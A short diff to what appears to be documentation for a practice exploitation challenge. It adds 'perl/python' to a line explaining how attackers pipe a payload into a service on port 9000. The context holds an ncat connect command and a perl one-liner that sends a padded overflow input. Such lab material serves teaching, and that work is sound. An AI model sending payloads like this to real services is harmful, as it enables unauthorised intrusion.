@@ -24,7 +24,7 @@ Attackers connect with:
 
     ncat 192.168.1.100 9000
 
-Attackers can pipe in their payload with, which allows for non ascii characters:
+Attackers can pipe in their payload with perl/python, which allows for non ascii characters:
 
     perl -e 'print "A"x32 . "1337\n"' | ncat 192.168.1.100 9000
 
